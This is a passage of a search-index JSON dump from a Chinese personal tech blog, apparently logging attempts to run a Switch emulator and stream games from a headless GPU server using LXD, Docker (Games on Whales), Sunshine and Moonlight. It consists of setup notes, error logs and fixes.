\u865a\u62df\u673a\u65b9\u6848\uff08\u4e0d\u7528\u4e86\uff09","text":"<p>p.s. lxd \u5fc5\u987b\u4f7f\u7528\u672c\u5730\u7528\u6237\uff0c\u670d\u52a1\u5668\u73b0\u5728\u5df2\u7ecf\u6ca1\u6709\u672c\u5730 home \u76ee\u5f55\u4e86\uff0c\u56e0\u6b64\u8fd9\u4e2a\u65b9\u6848\u4e0d\u518d\u9002\u7528\u3002</p> <pre><code>Sorry, home directories outside of /home needs configuration.\nSee https://forum.snapcraft.io/t/11209 for details.\n</code></pre>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#steam-\u5b89\u88c5","title":"steam \u5b89\u88c5","text":"<p>5 Simple Ways to Install Steam on Linux - wikiHow Steam under Linux - Valve Developer Community (valvesoftware.com) dpkg i386</p> <p>steam play(proton) Linux Gaming with Ubuntu Desktop Part 1: Steam &amp; Proton | Ubuntu</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#steam-link-\u4f7f\u7528","title":"steam link \u4f7f\u7528","text":"<p>steam link\u6d41\u5f0f\u4f20\u8f93\u9519\u8bef \u65e0\u6cd5\u8fde\u63a5\u4ee5\u4e2d\u7ee7 - \u521a\u5f00\u59cb\u624b\u673asteam link\u65e0\u6cd5\u8fde\u63a5\u3002\u5728lxd\u5bb9\u5668\u5185\u5f00\u542fwg\u5168\u90e8\u6d41\u91cf\u8d70op2\u540e\u53ef\u4ee5\u3002 - \u4f46\u662f\u7b14\u8bb0\u672csteam link\u4e0d\u884c\uff0c\u751a\u81f3\u53ef\u4ee5\u6d4b\u5f97\u901f\u7387\u3002   - \u7b14\u8bb0\u672c\u4e5f\u5f00\u542fwg\u5168\u90e8\u6d41\u91cf\u8d70op2\u3002\u5c45\u7136\u5c31\u53ef\u4ee5\u8fde\u63a5\u4e86   - \u770b\u5230\u65e5\u5fd7\u662f@LAN\u4e24\u8fb9\u7684ipv6\u5730\u5740</p> <p>steam link\u6709\u58f0\u97f3\uff0c\u5ef6\u8fdf\u7ea2\u7ebf\u662f60\u3002 \u53ef\u4ee5\u73a9\u661f\u9732\u8c37\uff0c\u4f46\u662f\u65e0\u6cd5\u4f7f\u7528\u624b\u67c4\u64cd\u4f5c\u3002</p> <p></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#sunshine-\u914d\u7f6e","title":"sunshine \u914d\u7f6e","text":"<p>parsec althernative - moonlight + sunshine (6) Parsec alternative for Linux : linux_gaming (reddit.com)</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#setup","title":"setup","text":"<p>Nvidia\u2019s GameStream is dead. Sunshine and Moonlight are great replacements. | Ars Technica Usage - Sunshine documentation (lizardbyte.dev)</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#use-nvidia-runtime","title":"use nvidia runtime","text":"<pre><code>Error: Failed to create session: Version mismatch between NvFBC and the X driver interface\n[2023:05:15:02:38:46]: Error: Couldn't expose some/all drm planes for card: /dev/dri/card8\n\nError: Could not open codec [h264_nvenc]: Function not implemented\nError: Failed to create a CUDA device: Operation not supported\n</code></pre> <p>\u624b\u52a8\u5b89\u88c5nvida driver\u4f1a\u5305\u542bx driver\uff0c\u56e0\u6b64\u5bfc\u81f4broken</p> <p>Did you build from source, and if so, does the build include CUDA support and how was CUDA installed in that case? I've seen the 'version mismatch between NvFBC and X driver' error when the NVidia driver installation is broken and multiple versions of driver &amp; nvidia library versions exist on the system at build time. One source of this is manually installing CUDA by using the NVidia installer from their website instead of using only distro packages. The reason is that the CUDA installer from NVidia includes the full X driver as well so if you install the distro drivers then install the NVidia CUDA manually, your driver config will be broken and building with CUDA support enabled will get you this error.</p> <p>\u5378\u8f7dnvida\u9a71\u52a8\u540e\uff0c\u4f7f\u7528nvidia runtime - Error: Couldn't import RGB Image: 00003009 &amp; Error: Unknown status &amp; Error: Failed to create session: Version mismatch between NvFBC and the X driver interface \u00b7 Issue #514 \u00b7 LizardByte/Sunshine (github.com) <pre><code>Error: Couldn't find any of the following libraries: [libnvidia-fbc.so.1, libnvidia-fbc.so]\n[2023:05:15:14:01:19]: Error: Couldn't expose some/all drm planes for card: /dev/dri/card8\nError: Could not open codec [h264_nvenc]: Operation not permitted\n\nError: Failed to create a CUDA device: Operation not supported\n</code></pre></p> <pre><code>apt install libnvidia-fbc1-530\n</code></pre>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#lxd-\u624b\u67c4","title":"lxd \u624b\u67c4","text":"<p>moonlight\u8fde\u63a5sunshine\u540e\uff0c\u6ca1\u6709\u624b\u67c4\u3002\u5c1d\u8bd5\u5728lxd\u4e2d\u6dfb\u52a0/dev/uinput\uff0c\u7ed3\u679cmoonlight\u8fde\u63a5\u540e\u8fde\u952e\u9f20\u90fd\u65e0\u6cd5\u64cd\u4f5c\u4e86\u3002</p> <p>\u4f46\u662fsteam link\u662f\u53ef\u4ee5\u7684\uff0c\u53d1\u73b0steam link\u8fde\u63a5\u540e\uff0c/dev/input\u4e0b\u4f1a\u51fa\u73b0js0\u548c\u5bf9\u5e94evet\u3002\u5c06\u8fd9\u4e9b\u90fdlxc add\u540e\uff08\u4e5f\u5c31\u662f\u8bf4\u9700\u8981steam link\u8fde\u63a5\u540e\u518d\u624b\u52a8\u6dfb\u52a0\uff09\uff0c\u5bb9\u5668\u5185\u786e\u5b9e\u53ef\u4ee5\u624b\u67c4\u64cd\u4f5c\u4e86\u3002\u4f46\u662f\u8981\u60f3\u8ba9yuzu\u68c0\u6d4b\u5230\u624b\u67c4\uff0c\u8fd8\u9700\u8981\u901a\u8fc7steam\u542f\u52a8yuzu\u624d\u884c\u3002</p> <p>\u540e\u9762\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u76f4\u901a/dev/input\uff08\u5f53\u7136\u4e3a\u4e86\u907f\u514d\u6743\u9650\u95ee\u9898\uff0clxd\u53ef\u4ee5\u4ee5\u7279\u6743\u5bb9\u5668\u8fd0\u884c\uff0c\u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u7ecf\u8fc7uid\u548cgid\u6620\u5c04\uff09\uff0c\u7136\u540emoonlight\u8fde\u63a5\u540e\uff0c\u952e\u9f20\u6ca1\u6709\u51fa\u73b0\u95ee\u9898\u3002\u4f46\u662f\u624b\u67c4\u8fd8\u662f\u4e0d\u884c\uff0c\u62a5\u9519\u3002\u611f\u89c9\u53ef\u4ee5\u89e3\u51b3\uff0c\u4f46\u662f\u53d1\u73b0\u5e27\u6570\u548cdocker\u65b9\u6848\u5dee\u4e0d\u591a\uff0c\u56e0\u6b64\u5c31\u6ca1\u53bb\u5c1d\u8bd5\u89e3\u51b3\u4e86\u3002 <pre><code>Error: Could not create Sunshine Gamepad: Permission denied\n</code></pre></p> <p>lxd\u76f4\u901a\u624b\u67c4 Joystick Passthrough - LXD - Linux Containers Forum Unable to get input in container - LXD - Linux Containers Forum 7. uinput module \u2014 The Linux Kernel documentation</p> <pre><code> lxc config device add ubuntu20 event unix-char path=/dev/input/event uid=1001 gid=1001 mode=0777\n</code></pre> <ul> <li>\u5728host\u8fd0\u884cxorg\uff0c\u5c06unix socket\u66b4\u9732\u7ed9\u5bb9\u5668\u3002\u8fd0\u884csteam\u7684\u65b9\u6cd5Unable to get input in container - LXD - Linux Containers Forum <p>I suspect it may have to do with Xorg trying to list things through udev and udev not having database entries for those devices. You could maybe cheat by copying the /run/udev data across to the container prior to starting Xorg, though I wonder if it wouldn\u2019t be cleaner to run Xorg outside of the container, leaving all the input stuff handled there and then just expose the X11 socket to the container for it to run kodi against. That\u2019d be closer to other setups described on this forum before for running things like steam inside of a container.</p> </li> </ul> <p>\u65b0\u53d1\u73b0\uff1a - /run/udev\u65e0\u6cd5\u76f4\u901a\u5230lxd\u5bb9\u5668\u5185\uff08tmpfs\u7684\u539f\u56e0\uff1f\uff09 - \u4ee5\u666e\u901a\u7528\u6237\u542f\u52a8tigervnc\uff0c\u542f\u52a8sunshine\uff0c/dev/input\u76ee\u5f55\u4e0b\u5e76\u6ca1\u6709\u51fa\u73b0\u952e\u76d8\u8bbe\u5907\u548cjs\u8bbe\u5907\uff08docker\u65b9\u6848\u51fa\u73b0\u4e86mouse0-2, js0-1\uff09 - \u4ee5root\u7528\u6237\u542f\u52a8tigervnc\uff0c\u666e\u901a\u7528\u6237\u542f\u52a8sunshine\uff0c/dev/input\u51fa\u73b0\u4e86\u952e\u9f20\u3002\u4f46\u662f\u65e0\u6cd5\u64cd\u4f5c\u952e\u9f20\u4e86\u3002</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#docker\u65b9\u6848--game-on-whale-\u88ab-wolf-\u5347\u7ea7\u66ff\u4ee3","title":"Docker\u65b9\u6848--Game on Whale (\u88ab wolf \u5347\u7ea7\u66ff\u4ee3)","text":"<p>\u5728docker\u5bb9\u5668\u91cc\u8dd1x11\u5e94\u7528\u3002\u53ef\u4ee5\u76f4\u63a5\u5728host\u4e0a\u663e\u793a\uff0c\u4e5f\u53ef\u4ee5\u8fd0\u884c\u5728headless\u670d\u52a1\u5668\u4e0a\uff0c\u901a\u8fc7sunshine\u4e32\u6d41\u5230\u672c\u5730\u3002</p> <ul> <li>\u652f\u6301\u58f0\u97f3</li> <li>\u652f\u6301\u624b\u67c4</li> <li>\u4e32\u6d41\u652f\u6301\u786c\u4ef6\u52a0\u901f\uff08nvec, vaapi, libx264\uff09</li> </ul> <ul> <li>\u7ec4\u4ef6\u4ecb\u7ecd\uff1aComponents Overview :: Games On Whales (games-on-whales.github.io)</li> <li>\u6548\u679c\u5c55\u793a\uff1aRamblings from Jessie: Docker Containers on the Desktop (jessfraz.com)</li> </ul>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u7ec4\u4ef6\u5206\u6790","title":"\u7ec4\u4ef6\u5206\u6790","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#xorg","title":"xorg","text":"<pre><code># host desktop\u6a21\u5f0f\u4e0b\uff0c\u5bb9\u5668\u4f7f\u7528host\u7684xorg socket\nXORG_SOCKET=/tmp/.X11-unix/X0\nXORG_DISPLAY=:0\n\n# headless\u6a21\u5f0f\nXORG_SOCKET=xorg\nXORG_DISPLAY=:99\n\n# headless\u6a21\u5f0f\u4e0b\uff0c\u542f\u7528xorg\u5bb9\u5668\u3002\u8be5\u5bb9\u5668\u4f7f\u7528xorg volume\uff0c\u7528\u4e8e\u548c\u5176\u5b83\u5bb9\u5668\u5171\u4eab\u3002\n- ${XORG_SOCKET}:/tmp/.X11-unix\n\nXORG_IPC=shareable\nipc: ${XORG_IPC}  # xorg\u5bb9\u5668\u8bbe\u7f6eipc\u4e3a\u53ef\u5171\u4eab\n\nSHARED_IPC=service:xorg\nipc: ${SHARED_IPC} # \u5176\u5b83\u5bb9\u5668\u8bbe\u7f6eipc\u4e3axorg\u5bb9\u5668\n</code></pre>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#pulse","title":"pulse","text":"<pre><code>PULSE_SOCKET_HOST=pulse\nPULSE_SOCKET_GUEST=/tmp/pulse/\n\n# headless\u6a21\u5f0f\u4e0b\uff0c\u542f\u7528pulse\u5bb9\u5668\u3002\u8be5\u5bb9\u5668\u4f7f\u7528pulse volume\uff0c\u7528\u4e8e\u548c\u5176\u5b83\u5bb9\u5668\u5171\u4eab\u3002\n# \u6240\u6709\u5bb9\u5668\u5c06volume pulse\u6620\u5c04\u5230\u8be5\u8def\u5f84\u4e0b\n- ${PULSE_SOCKET_HOST}:${PULSE_SOCKET_GUEST}\n</code></pre>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#udev","title":"udev","text":"<pre><code>UDEVD_NETWORK=service:udevd\n</code></pre>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u989d\u5916\u8bbe\u7f6e","title":"\u989d\u5916\u8bbe\u7f6e","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#headless-display","title":"headless display","text":"<p>Monitor requirements :: Games On Whales (games-on-whales.github.io) - Edid.txt - xorg-screen.conf</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u4f7f\u7528\u95ed\u6e90gpu\u9a71\u52a8","title":"\u4f7f\u7528\u95ed\u6e90gpu\u9a71\u52a8","text":"<p>NVIDIA GPUs :: Games On Whales (games-on-whales.github.io)</p> <ul> <li>\u8bbe\u7f6envidia container toolkit\uff1a<code>sudo nvidia-ctk runtime configure</code></li> <li>env/nvidia.env\uff1aGUID\u9009\u62e9\u663e\u5361\uff1a<code>sudo nvidia-container-cli --load-kmods info</code></li> <li>\u8fd0\u884c\u65f6\u6dfb\u52a0--gpu nvidia\u9009\u9879</li> </ul>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#multi-gpu","title":"multi gpu","text":"<p>xorg-primary</p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u6dfb\u52a0\u81ea\u5b9a\u4e49app","title":"\u6dfb\u52a0\u81ea\u5b9a\u4e49app","text":"<p>\u9700\u8981\u57fa\u4e8ebase_app_image <pre><code>docker build -t yfy/gow-yuzu \\\n  --build-arg BASE_APP_IMAGE=gameonwhales/base-app:sha-b51c691 \\\n  .\n</code></pre></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#\u9047\u5230\u7684\u95ee\u9898_1","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#dbus-not-found","title":"dbus not found","text":"<p>sunshine\u4e2d\u9700\u8981\u4f7f\u7528dbus <pre><code>Failed to connect to system bus: Failed to connect to socket /run/dbus/system_bus_socket\n</code></pre></p> <p>host\u5b89\u88c5 <pre><code>apt install avahi-daemon\n</code></pre></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#docker-compse\u9700\u8981\u66f4\u65b0\u52302x","title":"docker-compse\u9700\u8981\u66f4\u65b0\u52302.x","text":"<pre><code>fyyuan@snode6 \u279c  gow git:(master) \u2717 ./run-gow --platform headless --app firefox pull\nYour docker-compose is too old; please install v2.6.0 or later.\n</code></pre> <p>\u65b0\u7684\u7248\u672c\u6362\u4e86\u547d\u4ee4</p> <p>Note that Compose standalone uses the\u00a0<code>-compose</code>\u00a0syntax instead of the current standard syntax\u00a0<code>compose</code>. For example type\u00a0<code>docker-compose up</code>\u00a0when using Compose standalone, instead of\u00a0<code>docker compose up</code>.</p> <p>\u9700\u8981\u5378\u8f7d\u8001\u7248\u672c\uff0c\u7136\u540e\u5b89\u88c5docker-compose-pulgin\uff08\u9700\u8981apt\u6dfb\u52a0\u4e86docker\u7ed9\u4ed3\u5e93\uff09 <pre><code>apt purge docker-compose\napt install docker-compose-pulgin\n</code></pre></p> <p>\u4f46\u662f\u76f4\u63a5\u8fd0\u884cdocker-compose\u4f1a\u627e\u4e0d\u5230\u547d\u4ee4 apt-file search docker-compose\u53ef\u4ee5\u53d1\u73b0docker-compose-pulgin\u63d0\u4f9b\u4e86\u8be5\u7a0b\u5e8f\uff0c\u4f7f\u7528\u8f6f\u8fde\u63a5\u5373\u53ef <pre><code> sudo ln -s /usr/libexec/docker/cli-plugins/docker-compose /bin/docker-compose\n</code></pre></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#sunshine\u975e\u5c40\u57df\u7f51\u65e0\u6cd5\u8fde\u63a5","title":"sunshine\u975e\u5c40\u57df\u7f51\u65e0\u6cd5\u8fde\u63a5","text":"<p>\u6253\u5f00\u7f51\u9875\u663e\u793a403</p> <p>sunshine log <pre><code>[2023:05:15:14:16:33]: Error: Failed to create session: This hardware does not support NvFBC\n[2023:05:15:14:16:33]: Error: Couldn't expose some/all drm planes for card: /dev/dri/card1\n\n[2023:05:15:14:16:33]: Info: Trying encoder [nvenc]\n[2023:05:15:14:16:33]: Info: Screencasting with X11\n\n[2023:05:15:14:16:34]: Error: Could not open codec [libx264]: Invalid argument\n</code></pre></p> <p>\u53d1\u73b0log\u548c\u5728\u81ea\u5df1\u53f0\u5f0f\u673a\u4e0a\u5dee\u4e0d\u591a\uff0c\u6700\u540e\u90fd\u662flibx264\u65e0\u6548\u53c2\u6570\u3002\u4f46\u662f\u53f0\u5f0f\u673a\u662f\u53ef\u4ee5\u6253\u5f00\u7f51\u9875\u7684\uff0c\u56e0\u6b64\u89c9\u5f97\u662f\u4e0d\u662f\u5176\u5b83\u95ee\u9898\u3002\u5c1d\u8bd5\u5728\u53f0\u5f0f\u673a\u4e0a\u8bbe\u7f6e\u914d\u7f6e\u6587\u4ef6\u4e3a\u53ea\u80fdpc\u8bbf\u95ee\uff0c\u53d1\u73b0\u7f51\u9875\u4e00\u6837\u62a5403\u9519\u8bef\u3002</p> <p>\u56e0\u4e3asunshine\u9ed8\u8ba4\u7684\u8bbe\u7f6e\u662f\u53ea\u5141\u8bb8lan\u5185\u8bbf\u95ee\u3002\u800c\u6211\u7684\u60c5\u51b5\u662f\u670d\u52a1\u5668\u6709\u516c\u7f51ip\uff0c\u867d\u7136docker\u76d1\u542c\u7684\u662f0.0.0.0\u7684\u5730\u5740\u3002\u4f46\u662f\u5bb9\u5668\u5185\u53d1\u73b0src\u5730\u5740\u4e0d\u662flan\u5c31\u4e22\u5f03\u4e86\u3002</p> <p>\u5c1d\u8bd5\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\uff0c\u4f4d\u4e8e<code>$local_state/sunshine/sunshine.conf</code>\uff08<code>local_state</code>\u5b9a\u4e49\u4e8e<code>user.env</code>\uff09\uff0c\u53ef\u4ee5\u8bbf\u95eeweb\u4e86\u3002\u4f46\u662fmoonlight\u65e0\u6cd5\u8fde\u63a5\u3002\u8ba9\u68c0\u67e5udp 47999\u7aef\u53e3\u3002\u67e5\u770bsunshine\u65e5\u5fd7\u53d1\u73b0\uff0c\u5b83\u76f4\u63a5\u5c1d\u8bd5\u8bbf\u95ee\u6211\u8fd9\u8fb9NAT\u540e\u7684\u516c\u7f51\u5730\u5740\u3002</p> <p>\u56e0\u6b64\u8fd9\u6837\u89e3\u51b3\u5f88\u9ebb\u70e6\u3002\u6b64\u65f6wireguard\u53c8\u6392\u4e0a\u7528\u573a\u4e86\u3002\u53ef\u4ee5\u4f7f\u7528wireguard\u8ba9\u670d\u52a1\u5668\u548c\u6211\u8fd9\u8fb9\u76f4\u63a5\u4f4d\u4e8e\u4e00\u4e2aLAN\u5185\uff01</p> <p>\u89e3\u51b3\u540e\u6210\u529f\u4f7f\u7528moonlight\u8fde\u63a5\u3002\u7531\u4e8eapp\u662ffirefox\uff0c\u56e0\u6b64\u53ef\u4ee5\u6253\u5f00\u7f51\u9875\uff0c\u64ad\u653e\u97f3\u4e50\u6709\u58f0\u97f3\uff01 - \u4f46\u662f\u4ecd\u7136\u65e0\u6cd5\u64ad\u653eb\u7ad9\u89c6\u9891\u3002\u73b0\u8c61\u4e3a\u4e00\u76f4\u52a0\u8f7d\u89c6\u9891 - \u6d4f\u89c8\u5668\u4e2d\u6587\u5b57\u4f53\u7f3a\u5931\u3002</p> <p></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#sunshine\u65e0\u6cd5\u6302\u8f7d\u8def\u5f84\u95ea\u9000","title":"sunshine\u65e0\u6cd5\u6302\u8f7d\u8def\u5f84\u95ea\u9000","text":"<p>\u5c1d\u8bd5\u5728A100 80g\u673a\u5668\u4e0a\u8dd1\u3002</p> <p>\u83ab\u540d\u5947\u5999\u9000\u51fa\u4e86 <pre><code>gow-sunshine-1  | chown: changing ownership of '/home/retro': Operation not permitted\ngow-steam-1     | chown: changing ownership of '/home/retro': Operation not permitted\ngow-steam-1 exited with code 1\ngow-sunshine-1 exited with code 1\n\ngow-xorg-1      | Setting DP-0 output to: 1920x1080@60\ngow-xorg-1      | warning: output DP-0 not found; ignoring\n</code></pre></p> <p>\u53d1\u73b0\u662fhome\u76ee\u5f55\u6743\u9650\u5bfc\u81f4\u7684\u3002\uff08nfs\u6302\u8f7d\u5bfc\u81f4root\u65e0\u6cd5\u5199nfs\u4e0b\u76ee\u5f55\uff09</p> <p>\u53d6\u6d88local_state\u6302\u8f7d\u540e\uff0cfirefox\u53ef\u4ee5\u8dd1\u3002\uff08\u4f46\u662f\u611f\u89c9\u662fCPU\u6e32\u67d3\uff1f\u9f20\u6807\u5f88\u5361\u3002\u800c\u4e14\u4e0d\u77e5\u9053\u4ec0\u4e48\u539f\u56e0\uff0c\u79fb\u52a8\u51e0\u4e0b\u9f20\u6807\u540e\u5c31\u753b\u9762\u5c31\u5361\u4f4f\u4e86\u3002\u64ad\u653eb\u7ad9\u89c6\u9891\u4e5f\u4f1a\u5361\u4f4f\uff09</p> <p>\u591a\u641e\u51e0\u4e0b\uff0c\u6700\u540e\u76f4\u63a5\u95ea\u9000\u4e86 <pre><code>[2023:05:16:03:58:59]: Info: CLIENT CONNECTED\n[2023:05:16:03:58:59]: Info: Detecting connected monitors\n[2023:05:16:03:58:59]: Info: Screencasting with X11\n[2023:05:16:03:58:59]: Info: Configuring selected monitor (0) to stream\n[2023:05:16:03:58:59]: Info: Streaming display: DVI-D-0 with res 2560x1600 offset by 0x0\n[2023:05:16:03:58:59]: Info: SDR color coding [Rec. 601]\n[2023:05:16:03:58:59]: Info: Color range: [MPEG]\n[2023:05:16:03:59:00]: Info: Setting default sink to: [sink-sunshine-stereo]\n[2023:05:16:03:59:00]: Info: Found default monitor by name: sink-sunshine-stereo.monitor\n[2023:05:16:03:59:52]: Info: CLIENT DISCONNECTED\n[2023:05:16:03:59:52]: Info: Setting default sink to: [null]\n[2023:05:16:03:59:52]: Info: /CN=NVIDIA GameStream Client -- verified\n[2023:05:16:03:59:52]: Info: /CN=NVIDIA GameStream Client -- verified\n[2023:05:16:03:59:55]: Info: /CN=NVIDIA GameStream Client -- verified\n[2023:05:16:03:59:55]: Info: /CN=NVIDIA GameStream Client -- verified\n[2023:05:16:04:00:17]: Fatal: Hang detected! Session failed to terminate in 10 seconds.\n\n\ngow-firefox-1   | [Child 359, MediaDecoderStateMachine #1] WARNING: Decoder=7ff8e3e17d00 Decode error: NS_ERROR_DOM_MEDIA_FATAL_ERR (0x806e0005) - Error no decoder found for video/avc: file /build/firefox-HNs9Ru/firefox-113.0.1+build1/dom/media/MediaDecoderStateMachineBase.cpp:164\n</code></pre></p>","tags":["wolf","gow","linux","gaming","docker","\u865a\u62df\u6e38\u620f\u623f"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/24/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8Cswitch%E6%A8%A1%E6%8B%9F%E5%99%A8/#docker-compose\u6539\u4e3a\u76f8\u5bf9\u8def\u5f84\u540esunshine-exit2","title":"docker-compose\u6539\u4e3a\u76f8\u5bf9\u8def\u5f84\u540esunshine exit2","text":"<p>\u5c06gow\u590d\u5236\u5230root\u76ee\u5f55\uff0c\u7136\u540e\u4fee\u6539docker-compose\u4e2d\u5173\u4e8eedid\u7b49\u6587\u4ef6\u4e3a\u76f8\u5bf9\u8def\u5f84\u3002\u7ed3\u679c\u4e00\u8fd0\u884c\uff0csunshine\u5c31exit 2\u3002\u8c8c\u4f3c\u662f\u6ca1\u6709\u663e\u793a\u5668\uff1f 